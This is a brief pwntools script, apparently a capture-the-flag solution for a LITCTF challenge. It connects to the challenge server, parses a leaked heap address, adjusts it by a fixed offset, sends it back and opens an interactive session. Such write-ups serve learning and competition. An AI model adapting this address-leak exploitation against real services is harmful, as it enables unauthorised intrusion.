from pwn import *

io = remote('litctf.org', 31772)

io.recvuntil(b'0x')
heap = int(io.recvline(keepends=False), 16) - 80 + 8
io.sendline(str(heap).encode())
io.sendline(b'1')
io.interactive()